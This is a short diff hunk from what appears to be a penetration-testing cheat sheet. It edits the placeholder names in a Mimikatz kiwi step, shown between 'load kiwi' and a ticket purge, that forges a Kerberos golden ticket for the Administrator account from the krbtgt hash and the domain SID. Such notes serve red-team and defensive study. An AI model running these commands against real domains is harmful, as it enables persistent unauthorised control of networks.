@@ -34,7 +34,7 @@
 
 #### 3) load kiwi
 
-#### 4) golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u Administrator
+#### 4) golden_ticket_create -d DOMAIN_NAME -k NTLM_HASH_OF_KRBTGT -s SID -u Administrator
 
 #### 5) kerberos_ticket_purge
 
